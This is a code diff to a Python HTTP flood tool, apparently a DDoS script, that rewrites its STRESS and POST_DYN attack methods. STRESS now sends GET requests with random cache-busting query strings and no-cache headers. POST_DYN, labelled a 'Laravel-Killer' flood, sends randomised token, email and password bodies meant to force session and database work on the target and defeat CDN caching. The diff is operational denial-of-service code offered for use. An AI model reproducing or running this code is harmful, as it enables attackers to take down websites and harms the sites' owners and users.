@@ -3395,6 +3395,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def STRESS(self) -> None:
+        # [V51] High-volume cache-busting stress flood
         s = None
         try:
             s = self.open_connection()
@@ -3402,41 +3403,24 @@ class HttpFlood(Thread):
             CONNECTIONS_SENT += 1
 
             for _ in range(self._rpc):
-                # [OPTIMIZED] Dynamic Path
                 path = self.get_random_target_path()
                 ua = randchoice(self._useragents)
-                headers = self.build_consistent_headers(ua)
                 
-                # Rebuild payload manually to include dynamic path
-                payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
+                # Unique query string per request = guaranteed cache miss
+                payload = (f"GET {path}?cb={ProxyTools.Random.rand_str(12)}&t={int(time()*1000)} HTTP/1.1\r\n"
                            f"Host: {self._target.authority}\r\n"
                            f"User-Agent: {ua}\r\n"
-                           f"{headers}"
-                           f"Content-Length: 524\r\n"
-                           f"X-Requested-With: XMLHttpRequest\r\n"
-                           f"Content-Type: application/json\r\n\r\n"
-                           f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
+                           f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
+                           f"Accept-Encoding: gzip, deflate, br\r\n"
+                           f"Accept-Language: en-US,en;q=0.9\r\n"
+                           f"Cache-Control: no-cache, no-store\r\n"
+                           f"Pragma: no-cache\r\n"
+                           f"Connection: keep-alive\r\n\r\n")
                 
                 if Tools.send(s, payload.encode("utf-8")):
                     REQUESTS_SENT += 1
                     BYTES_SEND += len(payload)
-                    if int(REQUESTS_SENT) < 50:
-                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: Packet Sent to {self._target.authority}")
-                    # [FIX] Non-blocking status check AFTER send
-                    import select
-                    readable, _, _ = select.select([s], [], [], 0.01)
-                    if readable:
-                        try:
-                            response_start = s.recv(64).decode('utf-8', errors='ignore')
-                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
-                                status_code = response_start.split(" ")[1]
-                                if status_code in {"403", "429"}:
-                                    if hasattr(self, '_current_proxy'):
-                                        pass  #BURNED_PROXIES[self._current_proxy] = time()
-                                    raise Exception("Proxy Blocked")
-                        except Exception as e:
-                            if "Blocked" in str(e): raise e
-        except Exception as e:
+        except:
             pass
         Tools.safe_close(s)
 
@@ -3760,52 +3744,43 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def POST_DYN(self):
-        # [PHASE 2] Non-Cacheable POST Flood
-        path = self.get_random_target_path()
-        ua = randchoice(self._useragents)
-        headers = self.build_consistent_headers(ua)
-        
-        # Build realistic JSON Payload
-        json_data = f'{{"form_id": "{ProxyTools.Random.rand_str(8)}", "utm_source": "google", "data": "{ProxyTools.Random.rand_str(randint(200, 400))}"}}'
-        
-        # [PHASE 4] Referer Spoofing
-        ref = randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers)
-        
-        payload = (f"POST {path} HTTP/1.1\r\n"
-                   f"Host: {self._target.authority}\r\n"
-                   f"User-Agent: {ua}\r\n"
-                   f"{headers}"
-                   f"Referer: {ref}\r\n"
-                   f"Content-Type: application/json\r\n"
-                   f"Origin: {self._target.scheme}://{self._target.authority}\r\n"
-                   f"Content-Length: {len(json_data)}\r\n\r\n"
-                   f"{json_data}").encode("utf-8")
+        # [V51] Laravel-Killer POST Flood — Unique path+body per request = 100% cache miss
         s = None
         try:
             s = self.open_connection()
-            global CONNECTIONS_SENT, BURNED_PROXIES, REQUESTS_SENT, BYTES_SEND
+            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
             CONNECTIONS_SENT += 1
             for _ in range(self._rpc):
+                # Generate unique path every iteration to bypass CDN cache
+                path = self.get_random_target_path()
+                ua = randchoice(self._useragents)
+                
+                # Heavy Laravel-style form payload (forces CSRF middleware + session + DB)
+                rand_token = ProxyTools.Random.rand_str(40)
+                rand_email = f"{ProxyTools.Random.rand_str(8)}@{ProxyTools.Random.rand_str(5)}.com"
+                json_data = (f'{{"_token": "{rand_token}", '
+                             f'"email": "{rand_email}", '
+                             f'"password": "{ProxyTools.Random.rand_str(16)}", '
+                             f'"search": "{ProxyTools.Random.rand_str(randint(100, 300))}", '
+                             f'"data": "{ProxyTools.Random.rand_str(randint(200, 500))}"}}')
+                
+                ref = randchoice(self._referers)
+                payload = (f"POST {path}?_={ProxyTools.Random.rand_str(8)} HTTP/1.1\r\n"
+                           f"Host: {self._target.authority}\r\n"
+                           f"User-Agent: {ua}\r\n"
+                           f"Accept: application/json, text/plain, */*\r\n"
+                           f"Accept-Language: en-US,en;q=0.9\r\n"
+                           f"Accept-Encoding: gzip, deflate, br\r\n"
+                           f"Referer: {ref}\r\n"
+                           f"Content-Type: application/json\r\n"
+                           f"X-Requested-With: XMLHttpRequest\r\n"
+                           f"Origin: {self._target.scheme}://{self._target.authority}\r\n"
+                           f"Connection: keep-alive\r\n"
+                           f"Content-Length: {len(json_data)}\r\n\r\n"
+                           f"{json_data}").encode("utf-8")
                 if Tools.send(s, payload):
                     REQUESTS_SENT += 1
                     BYTES_SEND += len(payload)
-                    if int(REQUESTS_SENT) < 50:
-                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Packet Sent")
-                    # [FIX] Non-blocking status check using select
-                    import select
-                    readable, _, _ = select.select([s], [], [], 0.01)
-                    if readable:
-                        try:
-                            response_start = s.recv(64).decode('utf-8', errors='ignore')
-                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
-                                status_code = response_start.split(" ")[1]
-                                if status_code in {"403", "429"}:
-                                    pass  #BURNED_PROXIES[self._current_proxy] = time()
-                                    raise Exception("Proxy Blocked")
-                        except (BlockingIOError, ssl.SSLWantReadError):
-                            pass
-                        except Exception as e:
-                            if "Blocked" in str(e): raise e
         except:
             pass
         Tools.safe_close(s)
